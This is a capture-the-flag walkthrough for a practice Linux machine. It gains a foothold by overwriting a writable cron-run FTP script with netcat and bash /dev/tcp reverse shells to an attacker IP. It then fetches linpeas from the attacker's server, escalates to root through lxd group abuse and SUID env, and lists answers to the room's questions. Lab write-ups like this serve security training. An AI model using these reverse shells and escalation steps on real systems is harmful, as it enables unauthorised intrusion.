## FTP

- According to our nmap We are allowed to login as anonymous. It does work  
![image](https://user-images.githubusercontent.com/96747355/176789590-00febf49-a0d5-45f4-80c5-79ca143bd02f.png)  
- Here are the files we can download in our machine for further examination  
![image](https://user-images.githubusercontent.com/96747355/176789837-68e01438-4c77-4b90-bf71-b22e6bfb1232.png)  
- Here is the content of the files  
![image](https://user-images.githubusercontent.com/96747355/176790036-bf157c8f-6b52-4e8b-97ae-d518d19a708a.png)  
- It seems like we are allowed to write in the clean.sh file. Also if we check multiple times the scripts folder we can see that the log file is regurlarly updated. It is worth modifyin the script and try to get a reverse shell with it.  
![image](https://user-images.githubusercontent.com/96747355/176791076-258219c8-e3fa-48d4-90c4-677bf7912a2f.png)
- In the picture above we can see that the second ls shows that the log file is bigger and the time is later
- Let's try to modify the clean script with this 
```
#!/bin/bash

netcat 10.13.22.56 4444 -e /bin/bash
```
- We set our listener `rlwrap nc -lvnp 4444`
- We transfer the new file  
![image](https://user-images.githubusercontent.com/96747355/176791697-6d3b82f9-82fd-4720-bbcf-2996cfa89627.png)
- So nothing happens with this. If we check the hint it mentions unexpected results with netcat.
- Let's try with bash instead of netcat `bash -i >& /dev/tcp/10.13.22.56/4444 0>&1` and put the new file in the scripts folder in the ftp  
- We get a shell as the user `namelessone` after a minute or so    
![image](https://user-images.githubusercontent.com/96747355/176949498-db6076e6-9025-4dd3-87f8-86998e37237c.png)  
- We can grab the user flag

## Privilege escalation

- Let's get linpeas in our target `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
- `python3 -m http.server 80`
- From our target `wget http://10.13.22.56/linpeas.sh` and `chmod +x linpeas.sh`
- We are part of interesting groups such as lxd sudo and adm. However sudo -l does not give anything back (we get prompted for the password). Let's try to abuse lxd and follow [this article](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/) 
- To summarize here are the commands I ran (using the blog post as reference)

```
# From my kali
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
sudo ./build-alpine
# Setup HTTP server to host the image
python3 -m http.server 80
# From the target
wget http://10.13.22.56/alpine-v3.16-x86_64-20220701_1459.tar.gz
mv alpine-v3.16-x86_64-20220701_1459.tar.gz alpine.tar.gz
lxc image import ./alpine.tar.gz --alias myimage
lxd init 
# we push enter to all the prompts to keep default setup
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
- It works, we are root  
![image](https://user-images.githubusercontent.com/96747355/176962259-df97417d-b029-4cba-8fc8-23d738145dc2.png)  
- We can grab the last flag. We need to access to the point where the system is mounted `cd /mnt/root` and we grab the flag `cat root/root.txt`!  

## Privesc alternative quicker way

- Note for this way it is really important to not forget to use a tty shell we can get it after catching our shell with this command `python -c 'import pty; pty.spawn("/bin/sh")'`
- The suid bit is set on env so we can use it to privesc with the command that can be found [here](https://gtfobins.github.io/gtfobins/env/#suid)

- It works

## Questions

1. Enumerate the machine.  How many ports are open? `4`
2. What service is running on port 21? `ftp`
3. What service is running on ports 139 and 445? `smb`
4. There's a share on the user's computer.  What's it called? `pics`
- I let you find the flags :)
